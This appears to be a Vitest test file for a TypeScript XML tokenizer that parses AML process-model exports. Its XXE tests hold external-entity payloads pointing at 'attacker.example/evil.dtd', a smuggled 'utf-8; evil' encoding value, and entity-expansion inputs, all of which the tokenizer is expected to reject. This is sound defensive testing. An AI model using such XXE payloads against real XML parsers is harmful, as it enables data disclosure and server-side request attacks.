import { afterEach, describe, expect, it, vi } from 'vitest'

import { tokenizeXmlInBrowser, type WorkerLike } from './browserXmlTokenizer'
import {
  DEFAULT_XML_TOKENIZER_LIMITS,
  expandXmlEntities,
  tokenizeXmlDocument,
  XmlTokenizerError,
  type XmlElementNode,
  type XmlNode
} from './xmlTokenizer'
import { handleXmlTokenizerWorkerRequest } from './xmlTokenizer.worker'
import type {
  XmlTokenizerWorkerRequest,
  XmlTokenizerWorkerResponse
} from './xmlTokenizerWorkerProtocol'

/** The raw span recorded for a token must slice back to exactly its `raw` text. */
function expectRawSpanMatches(
  source: string,
  token: { raw: string; span: { start: { offset: number }; end: { offset: number } } }
): void {
  expect(source.slice(token.span.start.offset, token.span.end.offset)).toBe(token.raw)
}

function findElement(nodes: readonly XmlNode[], name: string): XmlElementNode | null {
  for (const node of nodes) {
    if (node.kind === 'element') {
      if (node.name === name) return node
      const nested = findElement(node.children, name)
      if (nested) return nested
    }
  }
  return null
}

describe('tokenizeXmlDocument — minimal AML', () => {
  it('tokenizes a minimal document into the expected CST with correct root, node count, and depth', () => {
    const xml = '<AML><Model Model.ID="M1"/></AML>'
    const document = tokenizeXmlDocument(xml)

    expect(document.rootElementName).toBe('AML')
    expect(document.nodeCount).toBe(2)
    expect(document.maxDepth).toBe(2)
    expect(document.tokens.map((token) => token.kind)).toEqual([
      'start-tag',
      'empty-tag',
      'end-tag'
    ])

    const root = document.children[0]
    if (!root || root.kind !== 'element') throw new Error('expected AML root element')
    expect(root.name).toBe('AML')
    expect(root.children).toHaveLength(1)
    const model = root.children[0]
    if (!model || model.kind !== 'element') throw new Error('expected Model element')
    expect(model.startTag.kind).toBe('empty-tag')
    expect(model.startTag.attributes).toHaveLength(1)
    expect(model.startTag.attributes[0]).toMatchObject({
      name: 'Model.ID',
      value: 'M1',
      quote: '"'
    })
    expectRawSpanMatches(xml, root.startTag)
    expectRawSpanMatches(xml, model.startTag)
  })
})

describe('tokenizeXmlDocument — internal entities', () => {
  it('captures <!ENTITY> declarations and expands them correctly in text and attribute values', () => {
    const xml = [
      '<?xml version="1.0"?>',
      '<!DOCTYPE AML [',
      '  <!ENTITY Company "OrbitPM Inc.">',
      ']>',
      '<AML Vendor="&Company; Global"><Name>Provided by &Company;</Name></AML>'
    ].join('\n')
    const document = tokenizeXmlDocument(xml)

    expect(document.doctype?.entityDeclarations).toHaveLength(1)
    const declaration = document.doctype!.entityDeclarations[0]!
    expect(declaration).toMatchObject({ name: 'Company', value: 'OrbitPM Inc.', quote: '"' })

    const root = document.children.find((node): node is XmlElementNode => node.kind === 'element')
    if (!root) throw new Error('expected root element')
    const vendorAttribute = root.startTag.attributes.find(
      (attribute) => attribute.name === 'Vendor'
    )
    expect(vendorAttribute?.value).toBe('&Company; Global') // raw, unexpanded — lossless
    expect(expandXmlEntities(vendorAttribute!.value, document.doctype!.entityDeclarations)).toBe(
      'OrbitPM Inc. Global'
    )

    const nameElement = findElement(document.children, 'Name')
    if (!nameElement) throw new Error('expected Name element')
    const textNode = nameElement.children.find((child) => child.kind === 'text')
    if (!textNode || textNode.kind !== 'text') throw new Error('expected text node')
    expect(textNode.token.content).toBe('Provided by &Company;') // raw, unexpanded
    expect(expandXmlEntities(textNode.token.content, document.doctype!.entityDeclarations)).toBe(
      'Provided by OrbitPM Inc.'
    )
  })

  it('resolves standard predefined entities alongside declared ones', () => {
    const expanded = expandXmlEntities('Fish &amp; Chips &lt;tag&gt; &#65;&#x42;', [])
    expect(expanded).toBe('Fish & Chips <tag> AB')
  })
})

describe('tokenizeXmlDocument — custom entity names', () => {
  it('resolves non-standard entity names (dots, hyphens, underscores)', () => {
    const xml = [
      '<!DOCTYPE AML [',
      '  <!ENTITY My.Custom_Entity-1 "Configurable Widget">',
      ']>',
      '<AML><Label>&My.Custom_Entity-1;</Label></AML>'
    ].join('\n')
    const document = tokenizeXmlDocument(xml)
    expect(document.doctype?.entityDeclarations[0]?.name).toBe('My.Custom_Entity-1')

    const label = findElement(document.children, 'Label')
    if (!label) throw new Error('expected Label element')
    const textNode = label.children.find((child) => child.kind === 'text')
    if (!textNode || textNode.kind !== 'text') throw new Error('expected text node')
    expect(expandXmlEntities(textNode.token.content, document.doctype!.entityDeclarations)).toBe(
      'Configurable Widget'
    )
  })
})

describe('tokenizeXmlDocument — multi-line tags', () => {
  it('records exact line, column, and byte offsets for a start tag spanning multiple lines', () => {
    const xml = [
      '<AML>',
      '<Model',
      '  Model.ID="M1"',
      '  Model.Type="EPC"',
      '>',
      '</Model>',
      '</AML>'
    ].join('\n')
    const document = tokenizeXmlDocument(xml)
    const model = findElement(document.children, 'Model')
    if (!model) throw new Error('expected Model element')
    const { span, raw } = model.startTag

    // Ground truth computed independently by walking the source string.
    expect(span.start).toEqual({ offset: 6, byteOffset: 6, line: 2, column: 1 })
    expect(span.end).toEqual({ offset: 49, byteOffset: 49, line: 5, column: 2 })
    expect(raw).toBe('<Model\n  Model.ID="M1"\n  Model.Type="EPC"\n>')
    expectRawSpanMatches(xml, model.startTag)
  })

  it('records byte offsets that diverge from character offsets for multi-byte UTF-8 content', () => {
    const xml = '<AML Note="café \u{1F600} end"/>'
    const document = tokenizeXmlDocument(xml)
    const root = document.children[0]
    if (!root || root.kind !== 'element') throw new Error('expected root element')
    const attribute = root.startTag.attributes[0]!
    expect(attribute.name).toBe('Note')
    expect(attribute.value).toBe('café \u{1F600} end')
    // Ground truth: 'é' is 2 UTF-8 bytes, the emoji is 4 UTF-8 bytes (2 UTF-16 units).
    expect(attribute.valueSpan.start).toMatchObject({ offset: 11, byteOffset: 11 })
    expect(attribute.valueSpan.end).toMatchObject({ offset: 22, byteOffset: 25 })
  })
})

describe('tokenizeXmlDocument — unknown tags and attributes', () => {
  it('preserves an unrecognized element with an exact raw span', () => {
    const xml = '<AML><Vendor:CustomFieldX>payload</Vendor:CustomFieldX></AML>'
    const document = tokenizeXmlDocument(xml)
    const custom = findElement(document.children, 'Vendor:CustomFieldX')
    if (!custom) throw new Error('expected unknown element to be preserved')
    expect(custom.startTag.raw).toBe('<Vendor:CustomFieldX>')
    expect(custom.endTag?.raw).toBe('</Vendor:CustomFieldX>')
    expectRawSpanMatches(xml, custom.startTag)
    expectRawSpanMatches(xml, custom.endTag!)
  })

  it('preserves unrecognized attributes with name, value, quote style, and byte span', () => {
    const xml = `<AML><Node data-flag="true" xml:lang='en-US'/></AML>`
    const document = tokenizeXmlDocument(xml)
    const node = findElement(document.children, 'Node')
    if (!node) throw new Error('expected Node element')
    expect(node.startTag.attributes).toHaveLength(2)

    const dataFlag = node.startTag.attributes.find((attribute) => attribute.name === 'data-flag')!
    expect(dataFlag).toMatchObject({ name: 'data-flag', value: 'true', quote: '"' })
    expect(xml.slice(dataFlag.valueSpan.start.offset, dataFlag.valueSpan.end.offset)).toBe('true')

    const xmlLang = node.startTag.attributes.find((attribute) => attribute.name === 'xml:lang')!
    expect(xmlLang).toMatchObject({ name: 'xml:lang', value: 'en-US', quote: "'" })
    expect(xml.slice(xmlLang.valueSpan.start.offset, xmlLang.valueSpan.end.offset)).toBe('en-US')
  })
})

describe('tokenizeXmlDocument — comments and processing instructions', () => {
  it('captures comments and processing instructions as distinct token kinds with exact raw spans', () => {
    const xml = '<AML><!-- top level comment --><?orbitpm directive="value"?><Node/></AML>'
    const document = tokenizeXmlDocument(xml)

    const commentToken = document.tokens.find((token) => token.kind === 'comment')
    if (!commentToken || commentToken.kind !== 'comment')
      throw new Error('expected a comment token')
    expect(commentToken.raw).toBe('<!-- top level comment -->')
    expect(commentToken.content).toBe(' top level comment ')
    expectRawSpanMatches(xml, commentToken)

    const piToken = document.tokens.find((token) => token.kind === 'processing-instruction')
    if (!piToken || piToken.kind !== 'processing-instruction') {
      throw new Error('expected a processing-instruction token')
    }
    expect(piToken.raw).toBe('<?orbitpm directive="value"?>')
    expect(piToken.target).toBe('orbitpm')
    expect(piToken.content).toBe('directive="value"')
    expectRawSpanMatches(xml, piToken)

    const root = document.children.find((node): node is XmlElementNode => node.kind === 'element')
    if (!root) throw new Error('expected root element')
    expect(root.children.some((child) => child.kind === 'comment')).toBe(true)
    expect(root.children.some((child) => child.kind === 'processing-instruction')).toBe(true)
  })
})

describe('tokenizeXmlDocument — truncated XML', () => {
  it('fails closed with a precise diagnostic when a start tag is cut off mid-name', () => {
    const xml = '<AML><Mod'
    expect(() => tokenizeXmlDocument(xml)).toThrow(/Unterminated XML start tag/u)
    try {
      tokenizeXmlDocument(xml)
      throw new Error('expected tokenizeXmlDocument to throw')
    } catch (error) {
      expect(error).toBeInstanceOf(XmlTokenizerError)
      expect((error as XmlTokenizerError).code).toBe('malformed-xml')
      expect((error as XmlTokenizerError).offset).toBe(xml.length)
    }
  })

  it('fails closed with a precise diagnostic when an attribute value is cut off', () => {
    const xml = '<AML><Model Model.ID="M1'
    try {
      tokenizeXmlDocument(xml)
      throw new Error('expected tokenizeXmlDocument to throw')
    } catch (error) {
      expect(error).toBeInstanceOf(XmlTokenizerError)
      expect((error as XmlTokenizerError).code).toBe('malformed-xml')
      expect((error as XmlTokenizerError).message).toMatch(/Unterminated XML attribute value/u)
      expect((error as XmlTokenizerError).offset).toBe(xml.indexOf('M1'))
    }
  })

  it('fails closed instead of returning a silent partial tree when elements are left open at EOF', () => {
    const xml = '<AML><Model Model.ID="M1"></Model>'
    try {
      tokenizeXmlDocument(xml)
      throw new Error('expected tokenizeXmlDocument to throw')
    } catch (error) {
      expect(error).toBeInstanceOf(XmlTokenizerError)
      expect((error as XmlTokenizerError).code).toBe('malformed-nesting')
      expect((error as XmlTokenizerError).message).toMatch(/<AML> is not closed/u)
      expect((error as XmlTokenizerError).offset).toBe(xml.length)
    }
  })
})

describe('tokenizeXmlDocument — duplicate attributes', () => {
  it('rejects duplicate attributes on a single element with a precise offset', () => {
    const xml = '<AML><Node a="1" a="2" /></AML>'
    try {
      tokenizeXmlDocument(xml)
      throw new Error('expected tokenizeXmlDocument to throw')
    } catch (error) {
      expect(error).toBeInstanceOf(XmlTokenizerError)
      expect((error as XmlTokenizerError).code).toBe('duplicate-attribute')
      expect((error as XmlTokenizerError).message).toMatch(/Duplicate XML attribute "a"/u)
      expect((error as XmlTokenizerError).offset).toBe(xml.indexOf('a="2"'))
    }
  })

  it('does not reject the same attribute name reused on two different, unrelated elements', () => {
    const document = tokenizeXmlDocument('<AML><A id="1"/><B id="2"/></AML>')
    expect(document.rootElementName).toBe('AML')
  })
})

describe('tokenizeXmlDocument — malformed nesting', () => {
  it('rejects a closing tag that does not match the current open element', () => {
    expect(() => tokenizeXmlDocument('<AML><A></AML>')).toThrowError(XmlTokenizerError)
    expect(() => tokenizeXmlDocument('<AML><A></AML>')).toThrow(/does not match/u)
  })

  it('rejects a stray closing tag with nothing open', () => {
    expect(() => tokenizeXmlDocument('</AML>')).toThrowError(XmlTokenizerError)
    try {
      tokenizeXmlDocument('</AML>')
    } catch (error) {
      expect((error as XmlTokenizerError).code).toBe('malformed-nesting')
    }
  })
})

describe('tokenizeXmlDocument — invalid encoding', () => {
  it('rejects a declared XML encoding with invalid characters', () => {
    const xml = '<?xml version="1.0" encoding="utf-8; evil"?><AML/>'
    try {
      tokenizeXmlDocument(xml)
      throw new Error('expected tokenizeXmlDocument to throw')
    } catch (error) {
      expect(error).toBeInstanceOf(XmlTokenizerError)
      expect((error as XmlTokenizerError).code).toBe('invalid-encoding')
    }
  })

  it('rejects an empty declared encoding', () => {
    const xml = '<?xml version="1.0" encoding=""?><AML/>'
    try {
      tokenizeXmlDocument(xml)
      throw new Error('expected tokenizeXmlDocument to throw')
    } catch (error) {
      expect((error as XmlTokenizerError).code).toBe('invalid-encoding')
    }
  })
})

describe('tokenizeXmlDocument — XXE / external DTD attempts', () => {
  afterEach(() => {
    vi.restoreAllMocks()
    Reflect.deleteProperty(globalThis, 'XMLHttpRequest')
  })

  function installNetworkTripwires() {
    const fetchSpy = vi.spyOn(globalThis, 'fetch').mockImplementation(() => {
      throw new Error('network fetch must never be attempted by the XML tokenizer')
    })
    class TripwireXMLHttpRequest {
      constructor() {
        throw new Error('XMLHttpRequest must never be constructed by the XML tokenizer')
      }
    }
    ;(globalThis as { XMLHttpRequest?: unknown }).XMLHttpRequest = TripwireXMLHttpRequest
    return { fetchSpy }
  }

  it('preserves an external DOCTYPE system id without resolving it, and never touches the network', () => {
    const { fetchSpy } = installNetworkTripwires()
    const document = tokenizeXmlDocument('<!DOCTYPE AML SYSTEM "ARIS-Export.dtd"><AML />')
    expect(document.doctype?.externalIdKind).toBe('system')
    expect(document.doctype?.externalIdLiteral).toBe('ARIS-Export.dtd')
    expect(document.children[0]).toMatchObject({ kind: 'element', name: 'AML' })
    expect(fetchSpy).not.toHaveBeenCalled()
  })

  it('rejects an internal <!ENTITY> declaration that references an external SYSTEM/PUBLIC resource, and never touches the network', () => {
    const { fetchSpy } = installNetworkTripwires()
    const xml = '<!DOCTYPE AML [<!ENTITY xxe SYSTEM "http://attacker.example/evil.dtd">]><AML/>'
    try {
      tokenizeXmlDocument(xml)
      throw new Error('expected tokenizeXmlDocument to throw')
    } catch (error) {
      expect(error).toBeInstanceOf(XmlTokenizerError)
      expect((error as XmlTokenizerError).code).toBe('external-entity')
      expect((error as XmlTokenizerError).message).toMatch(/External XML entities are not allowed/u)
    }
    expect(fetchSpy).not.toHaveBeenCalled()
  })

  it('rejects an internal <!ENTITY> declaration that references an external PUBLIC resource', () => {
    const xml =
      '<!DOCTYPE AML [<!ENTITY xxe PUBLIC "-//attacker//TEXT" "http://attacker.example/evil.dtd">]><AML/>'
    try {
      tokenizeXmlDocument(xml)
      throw new Error('expected tokenizeXmlDocument to throw')
    } catch (error) {
      expect(error).toBeInstanceOf(XmlTokenizerError)
      expect((error as XmlTokenizerError).code).toBe('external-entity')
    }
  })

  it('rejects a parameter entity declaration outright, even with a purely internal value', () => {
    const xml = '<!DOCTYPE AML [<!ENTITY % local "internal only">]><AML/>'
    try {
      tokenizeXmlDocument(xml)
      throw new Error('expected tokenizeXmlDocument to throw')
    } catch (error) {
      expect(error).toBeInstanceOf(XmlTokenizerError)
      expect((error as XmlTokenizerError).code).toBe('external-entity')
      expect((error as XmlTokenizerError).message).toMatch(
        /Parameter XML entities are not allowed/u
      )
    }
  })
})

describe('tokenizeXmlDocument — entity expansion attack bounds', () => {
  it('bounds the number of entity declarations', () => {
    const xml = [
      '<!DOCTYPE AML [',
      '<!ENTITY a "1">',
      '<!ENTITY b "2">',
      '<!ENTITY c "3">',
      ']>',
      '<AML/>'
    ].join('\n')
    try {
      tokenizeXmlDocument(xml, { maxEntityDeclarations: 2 })
      throw new Error('expected tokenizeXmlDocument to throw')
    } catch (error) {
      expect(error).toBeInstanceOf(XmlTokenizerError)
      expect((error as XmlTokenizerError).code).toBe('entity-limit')
      expect((error as XmlTokenizerError).message).toMatch(/more than 2 XML entities/u)
    }
  })

  it('bounds the length of an individual entity value', () => {
    const xml = ['<!DOCTYPE AML [', '<!ENTITY a "abcdef">', ']>', '<AML/>'].join('\n')
    try {
      tokenizeXmlDocument(xml, { maxEntityValueLength: 5 })
      throw new Error('expected tokenizeXmlDocument to throw')
    } catch (error) {
      expect(error).toBeInstanceOf(XmlTokenizerError)
      expect((error as XmlTokenizerError).code).toBe('entity-limit')
      expect((error as XmlTokenizerError).message).toMatch(/exceeds the 5-character limit/u)
    }
  })

  it('bounds entity expansion depth by rejecting a declaration whose value references another entity', () => {
    const xml = [
      '<!DOCTYPE AML [',
      '<!ENTITY a "base">',
      '<!ENTITY b "&a;more">',
      ']>',
      '<AML/>'
    ].join('\n')
    try {
      tokenizeXmlDocument(xml, {
        maxEntityDeclarations: 100,
        maxEntityValueLength: 1000,
        maxTotalEntityValueLength: 10000
      })
      throw new Error('expected tokenizeXmlDocument to throw')
    } catch (error) {
      expect(error).toBeInstanceOf(XmlTokenizerError)
      expect((error as XmlTokenizerError).code).toBe('entity-limit')
      expect((error as XmlTokenizerError).message).toMatch(
        /Nested XML entity expansion is not allowed/u
      )
    }
  })

  it('bounds the total expanded entity content across all declarations', () => {
    const xml = [
      '<!DOCTYPE AML [',
      '<!ENTITY a "12345678">',
      '<!ENTITY b "12345678">',
      ']>',
      '<AML/>'
    ].join('\n')
    try {
      tokenizeXmlDocument(xml, {
        maxEntityDeclarations: 10,
        maxEntityValueLength: 50,
        maxTotalEntityValueLength: 15
      })
      throw new Error('expected tokenizeXmlDocument to throw')
    } catch (error) {
      expect(error).toBeInstanceOf(XmlTokenizerError)
      expect((error as XmlTokenizerError).code).toBe('entity-limit')
      expect((error as XmlTokenizerError).message).toMatch(/exceeds the 15-character limit/u)
    }
  })

  it('does not trip any bound for a well-formed document under default limits', () => {
    expect(DEFAULT_XML_TOKENIZER_LIMITS.maxEntityDeclarations).toBeGreaterThan(0)
    const document = tokenizeXmlDocument(
      '<!DOCTYPE AML [<!ENTITY Company "OrbitPM">]><AML>&Company;</AML>'
    )
    expect(document.doctype?.entityDeclarations).toHaveLength(1)
  })
})

describe('tokenizeXmlDocument — unsafe name material', () => {
  it('cannot represent a path separator inside an XML name: the grammar rejects it at parse time', () => {
    // '/' is never a valid Name character, so an attacker cannot smuggle a
    // path-like segment through an element or attribute *name*. (Attachment
    // *content* path/filename sanitization happens one layer up, in the
    // semantic index — out of scope for the tokenizer itself.)
    expect(() => tokenizeXmlDocument('<AML><a/b></a/b></AML>')).toThrowError(XmlTokenizerError)
  })
})

describe('tokenizeXmlDocument — cancellation (sync path)', () => {
  it('rejects immediately via an already-aborted signal without returning a partial document', () => {
    const controller = new AbortController()
    controller.abort()
    try {
      tokenizeXmlDocument('<AML><Model/></AML>', undefined, controller.signal)
      throw new Error('expected tokenizeXmlDocument to throw')
    } catch (error) {
      expect(error).toBeInstanceOf(XmlTokenizerError)
      expect((error as XmlTokenizerError).code).toBe('cancelled')
    }
  })

  it('stops mid-parse, before EOF, when cancellation is signaled partway through a large document', () => {
    const parts: string[] = ['<AML>']
    for (let i = 0; i < 5000; i += 1) parts.push(`<Item id="${i}"/>`)
    parts.push('</AML>')
    const xml = parts.join('')

    let reads = 0
    const fakeSignal = {
      get aborted() {
        reads += 1
        return reads > 25
      },
      addEventListener: () => {},
      removeEventListener: () => {}
    } as unknown as AbortSignal

    try {
      tokenizeXmlDocument(xml, undefined, fakeSignal)
      throw new Error('expected tokenizeXmlDocument to throw')
    } catch (error) {
      expect(error).toBeInstanceOf(XmlTokenizerError)
      expect((error as XmlTokenizerError).code).toBe('cancelled')
      const offset = (error as XmlTokenizerError).offset
      expect(offset).toBeGreaterThan(0)
      expect(offset).toBeLessThan(xml.length)
    }
  })
})

class MockWorker implements WorkerLike {
  terminated = false
  posted: unknown[] = []
  private readonly messageListeners: Array<
    (event: MessageEvent<XmlTokenizerWorkerResponse>) => void
  > = []
  private readonly errorListeners: Array<(event: ErrorEvent) => void> = []

  postMessage(message: unknown): void {
    this.posted.push(message)
  }

  terminate(): void {
    this.terminated = true
  }

  addEventListener(type: 'message' | 'error', listener: (event: never) => void): void {
    if (type === 'message')
      this.messageListeners.push(
        listener as (event: MessageEvent<XmlTokenizerWorkerResponse>) => void
      )
    else this.errorListeners.push(listener as (event: ErrorEvent) => void)
  }

  removeEventListener(type: 'message' | 'error', listener: (event: never) => void): void {
    const list = type === 'message' ? this.messageListeners : this.errorListeners
    const index = list.indexOf(listener as never)
    if (index !== -1) list.splice(index, 1)
  }

  emitMessage(data: XmlTokenizerWorkerResponse): void {
    for (const listener of [...this.messageListeners])
      listener({ data } as MessageEvent<XmlTokenizerWorkerResponse>)
  }
}

describe('tokenizeXmlInBrowser — cancellation', () => {
  afterEach(() => {
    Reflect.deleteProperty(globalThis, 'Worker')
  })

  it('falls back to the synchronous tokenizer and rejects with AbortError when already aborted (no Worker available)', async () => {
    expect(typeof (globalThis as { Worker?: unknown }).Worker).toBe('undefined')
    const controller = new AbortController()
    controller.abort()
    await expect(
      tokenizeXmlInBrowser('<AML/>', { signal: controller.signal })
    ).rejects.toMatchObject({
      name: 'AbortError'
    })
  })

  it('terminates a freshly constructed worker and never posts a message when the signal is already aborted', async () => {
    ;(globalThis as { Worker?: unknown }).Worker = class {} as unknown
    const mock = new MockWorker()
    const controller = new AbortController()
    controller.abort()
    await expect(
      tokenizeXmlInBrowser('<AML/>', { signal: controller.signal, workerFactory: () => mock })
    ).rejects.toMatchObject({ name: 'AbortError' })
    expect(mock.terminated).toBe(true)
    expect(mock.posted).toHaveLength(0)
  })

  it('terminates an in-flight worker and rejects with AbortError on cancellation, ignoring any later message', async () => {
    ;(globalThis as { Worker?: unknown }).Worker = class {} as unknown
    const mock = new MockWorker()
    const controller = new AbortController()
    const promise = tokenizeXmlInBrowser('<AML/>', {
      signal: controller.signal,
      workerFactory: () => mock
    })
    expect(mock.posted).toHaveLength(1)
    controller.abort()
    await expect(promise).rejects.toMatchObject({ name: 'AbortError' })
    expect(mock.terminated).toBe(true)

    // A late, straggling result must never resolve the already-settled promise.
    let resolvedAfterAbort = false
    promise
      .then(() => {
        resolvedAfterAbort = true
      })
      .catch(() => {})
    mock.emitMessage({
      type: 'result',
      requestId: (mock.posted[0] as { requestId: string }).requestId,
      document: tokenizeXmlDocument('<AML/>')
    })
    await new Promise((resolve) => setTimeout(resolve, 0))
    expect(resolvedAfterAbort).toBe(false)
  })
})

describe('handleXmlTokenizerWorkerRequest', () => {
  it('posts a successful result for a well-formed document', () => {
    const request: XmlTokenizerWorkerRequest = { type: 'tokenize', requestId: 'r1', text: '<AML/>' }
    const responses: XmlTokenizerWorkerResponse[] = []
    handleXmlTokenizerWorkerRequest(request, (response) => responses.push(response))
    expect(responses).toHaveLength(1)
    expect(responses[0]).toMatchObject({ type: 'result', requestId: 'r1' })
    if (responses[0]!.type !== 'result') throw new Error('expected a result response')
    expect(responses[0].document.rootElementName).toBe('AML')
  })

  it('posts a mapped error code and message for a malformed document', () => {
    const request: XmlTokenizerWorkerRequest = {
      type: 'tokenize',
      requestId: 'r2',
      text: '<AML><Node a="1" a="2"/></AML>'
    }
    const responses: XmlTokenizerWorkerResponse[] = []
    handleXmlTokenizerWorkerRequest(request, (response) => responses.push(response))
    expect(responses).toHaveLength(1)
    expect(responses[0]).toMatchObject({
      type: 'error',
      requestId: 'r2',
      code: 'duplicate-attribute'
    })
  })
})

describe('tokenizeXmlDocument — AnimalWF-size input', () => {
  it('tokenizes a ~4 MiB synthetic document within a generous time bound and produces correct counts', () => {
    const HEADER =
      '<?xml version="1.0" encoding="UTF-8"?><AML><Group Group.ID="ROOT"><Model Model.ID="M0" Model.Type="EPC">'
    const FOOTER = '</Model></Group></AML>'
    const OBJECT_COUNT = 17_343 // sized to land at ~4 MiB total, verified below

    const parts: string[] = [HEADER]
    for (let i = 0; i < OBJECT_COUNT; i += 1) {
      parts.push(
        `<ObjOcc ObjOcc.ID="O${i}" Name="Synthetic Object ${i}">` +
          `<Position Pos.X="${i % 1000}" Pos.Y="${(i * 7) % 1000}"/>` +
          `<AttrDef.Value AttrDef.Type="AT_NAME">Synthetic node number ${i} for load testing of the tokenizer under AnimalWF-scale input.</AttrDef.Value>` +
          `</ObjOcc>`
      )
    }
    parts.push(FOOTER)
    const xml = parts.join('')

    // Sanity-check the fixture itself really is roughly AnimalWF-scale before
    // timing the tokenizer against it.
    expect(xml.length).toBeGreaterThanOrEqual(4 * 1024 * 1024)
    expect(xml.length).toBeLessThan(4.5 * 1024 * 1024)

    const start = performance.now()
    const document = tokenizeXmlDocument(xml, { maxTokens: 500_000 })
    const elapsedMs = performance.now() - start

    expect(elapsedMs).toBeLessThan(15_000)
    expect(document.rootElementName).toBe('AML')
    // 4 tokens for the header (declaration, AML, Group, Model start tags) + 6
    // per object (start ObjOcc, empty Position, start/text/end AttrDef.Value,
    // end ObjOcc) + 3 for the footer end tags.
    expect(document.tokens.length).toBe(4 + OBJECT_COUNT * 6 + 3)
    // 3 nodes for the header elements (AML, Group, Model) + 4 per object
    // (ObjOcc, Position, AttrDef.Value, its text child).
    expect(document.nodeCount).toBe(3 + OBJECT_COUNT * 4)
    expect(document.maxDepth).toBe(5)
  }, 20_000)
})
